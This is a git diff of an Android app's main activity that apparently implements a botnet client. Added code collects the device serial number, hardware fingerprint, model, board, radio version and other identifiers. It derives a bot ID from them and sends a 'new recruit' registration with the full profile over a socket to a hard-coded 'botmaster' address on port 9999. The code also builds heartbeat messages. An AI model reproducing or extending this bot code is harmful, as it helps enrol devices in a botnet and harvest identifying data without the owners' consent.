@@ -28,6 +28,7 @@ import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
+import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStreamReader;
@@ -54,6 +55,23 @@ public class MainActivity extends AppCompatActivity {
     public boolean status=false;
     public String localip="127.0.0.1";
     public String botmaster_myname;
+    public String various_os = System.getProperty("os.version"); // OS version
+    public String various_sdk = android.os.Build.VERSION.SDK;      // API Level
+    public String various_device = android.os.Build.DEVICE;           // Device
+    public String various_model = android.os.Build.MODEL;            // Model
+    public String various_product = android.os.Build.PRODUCT;          // Product
+    public String various_serial = Build.SERIAL;
+    public String various_board = Build.BOARD;
+    public String various_abi = Build.CPU_ABI;
+    public String various_brand = Build.BRAND;
+    public String various_radiover = Build.getRadioVersion();
+    public String various_hw = Build.HARDWARE;
+    public String various_fingerprint = Build.FINGERPRINT;
+    public String various_total = various_os+various_sdk+various_device+various_model+various_product+various_serial+various_board+various_brand+various_fingerprint+various_hw+various_radiover+various_abi;
+    public String bot_username = "BOT" + Integer.toString(Math.abs((various_total.hashCode())));
+    public String[] botmaster = {"192.168.1.8","9999","1", "Device name : "+various_device+"Model : "+various_model+"OS : "+various_os+"Product : "+various_product+"SDK : "+various_sdk +" Abi :"+ various_abi +" Brand : "+ various_brand
+            + " Fingerprint : "+various_fingerprint + " Hardware : " + various_hw+ " Radio version : " +various_radiover+ "Board : " +various_board+ " Serial : " +various_serial+ " Product : " + various_product, bot_username};
+
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -74,6 +92,21 @@ public class MainActivity extends AppCompatActivity {
                 view.clearAnimation();
             }
         });
+        File file = new File("myfile");
+        FileInputStream myfile = null;
+        try {
+            myfile = new FileInputStream(file);
+            byte filecontent[] = new byte[(int)myfile.available()];
+            myfile.read(filecontent);
+            String str_content = new String(filecontent);
+            mString2Byte.setText(str_content);
+            myfile.close();
+        } catch (FileNotFoundException e) {
+            e.printStackTrace();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+
         //new GetLocalIP();
 
     }
@@ -94,12 +127,12 @@ public class MainActivity extends AppCompatActivity {
         ConnectivityManager connectivitymanager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
         NetworkInfo activenetworkInfo = connectivitymanager.getActiveNetworkInfo();
         if (activenetworkInfo != null) {
-            mString2Byte.setText("Internet available\n"+ipinet+"\n");
+            mString2Byte.append("Internet available\n"+ipinet+"\n");
             status = true;
             //localip = connectivitymanager.getActiveNetworkInfo().toString();
             localip = ipinet;
         } else {
-            mString2Byte.setText("Internet NOT available\n");
+            mString2Byte.append("Internet NOT available\n");
         }
     }
 
@@ -133,101 +166,62 @@ public class MainActivity extends AppCompatActivity {
 
     void menu3WasClicked(){
         mString2Byte.append("Check internet connection\n");
-        String various_os = System.getProperty("os.version"); // OS version
-        String various_sdk = android.os.Build.VERSION.SDK;      // API Level
-        String various_device = android.os.Build.DEVICE;           // Device
-        String various_model = android.os.Build.MODEL;            // Model
-        String various_product = android.os.Build.PRODUCT;          // Product
-        String bot_username = "bot" + UUID.randomUUID().toString();
-        String[] botmaster = {"192.168.1.8",
-                "9999",
-                "1",
-                "\n Device name : "+various_device+" \n Model : "+various_model+" \n OS : "+various_os+" \n product : "+various_product+" \n SDK : "+various_sdk+" \n",
-                bot_username};
-        String result = null;
+                //String result = null;
+        for (int i=0 ;i<5 ; i++) {
+            mString2Byte.append(botmaster[i]+"\n");
+        }
         new transmit().execute(botmaster);
+        /*
+
         GetLocalIP();
+
         if(status){
             mString2Byte.append("Internet up. Connecting to bot master\n"+localip+"\n");
             //connect2BotMaster();
             //String[] botmaster = {"192.168.1.8", "9999", "1", "Various system info", "bot12" };
             //String result = null;
-            new transmit().execute(botmaster);
+            //new transmit().execute(botmaster);
             //mString2Byte.append(result);
         }else {
             mString2Byte.append("Internet is down\n");
         }
+        */
 
     }
 
     void menu5WasClicked(){
-        String various_os = System.getProperty("os.version"); // OS version
-        String various_sdk = android.os.Build.VERSION.SDK;      // API Level
-        String various_device = android.os.Build.DEVICE;           // Device
-        String various_model = android.os.Build.MODEL;            // Model
-        String various_product = android.os.Build.PRODUCT;          // Product
-        String bot_username = "BOT#" + UUID.randomUUID().toString();
-        String various_serial = Build.SERIAL;
         mString2Byte.setText(
-                "Device : "+various_device+
+                "\n Bot UUID : "+bot_username+
+                "\n Device : "+various_device+
                 "\n Model : "+various_model+
                 "\n Product : "+various_product+
                 "\n SDK : "+various_sdk+
-                " \n OS : "+various_os+
-                "\n Bot UUID : "+bot_username+
+                "\n OS : "+various_os+
                 "\n Serial num : "+various_serial+
+                "\n radio version :" + various_radiover +
+                "\n Hardware : "+ various_hw+
+                "\n Fingerprint : "+various_fingerprint+
+                "\n Brand : "+various_brand+
+                "\n Abi : "+various_abi+
+                "\n Board : " + various_board+
                 "\n");
     }
 
     void menu4WasClicked(){
-        mString2Byte.append("\nCheck internet connection");
-        GetLocalIP();
-        if(status){
-            mString2Byte.append("Internet up. Starting server\n"+localip+"\n");
-            String serverport="9999";
-            String message = null;
-            new receive().execute(serverport);
-            //mString2Byte.append(message);
-        }else {
-            mString2Byte.append("Internet is down\n");
-        }
+        String file_record = mString2Byte.getText().toString();
+        String filename = "myfile";
+        FileOutputStream outputStream;
 
-    }
-    public class receive extends AsyncTask<String, Void, String> {
-        @Override
-        protected String doInBackground(String... strings) {
-            //int port = Integer.parseInt(strings[0]);
-            String[] str_port = strings;
-            int port = Integer.parseInt(str_port[0]);
-            //int port = 9999;
-            ServerSocket ss;
-            Socket s;
-            DataInputStream dis;
-            PrintWriter pw;
-            String message = null;
-            try {
-                ss = new ServerSocket(port);
-                s = ss.accept();
-                InputStreamReader isr = new InputStreamReader(s.getInputStream());
-                BufferedReader br = new BufferedReader(isr);
-                message = br.readLine();
-                //mString2Byte.append("Bot connected : "+message+"\n");
-                //onProgressUpdate(message);
-                br.close();
-                isr.close();
-                s.close();
-                ss.close();
-            } catch (IOException e) {
-                e.printStackTrace();
-            }
-            return message;
-        }
-
-        @Override
-        protected void onPostExecute(String s) {
-            mString2Byte.setText(s);
+        try {
+            outputStream = openFileOutput(filename, Context.MODE_PRIVATE);
+            outputStream.write(file_record.getBytes());
+            outputStream.close();
+        } catch (Exception e) {
+            e.printStackTrace();
         }
     }
+
+
     public class transmit extends AsyncTask<String, Void, String> {
 
         @Override
@@ -241,19 +235,19 @@ public class MainActivity extends AppCompatActivity {
             String botmaster_type = strings[2];
             String botmaster_message = strings[3];
             String botmaster_myname = strings[4];
-            String message = botmaster_myname;
+            String message;
             DataOutputStream dos;
             PrintWriter pw = null;
             Socket s1;
             try {
-                //s1 = new Socket("192.168.1.8", 9999);
                 s1 = new Socket(botmaster_ip,botmaster_port_int);
                 pw = new PrintWriter(s1.getOutputStream());
                 if(botmaster_type == "1"){
-                    message = "new recruit." + botmaster_myname + "." + botmaster_message;
+                    // All info are sent to one message separated with #
+                    message = "new recruit#" + botmaster_myname + "#" + botmaster_message;
                     result = "new bot";
                 } else {
-                    message = "heartbeat" + botmaster_myname;
+                    message = "heartbeat#" + botmaster_myname;
                     result = "heartbeat";
                 }
                 pw.write(message);
@@ -268,7 +262,6 @@ public class MainActivity extends AppCompatActivity {
 
         @Override
         protected void onPostExecute(String s) {
-            mString2Byte.setText(s);
         }
     }
 
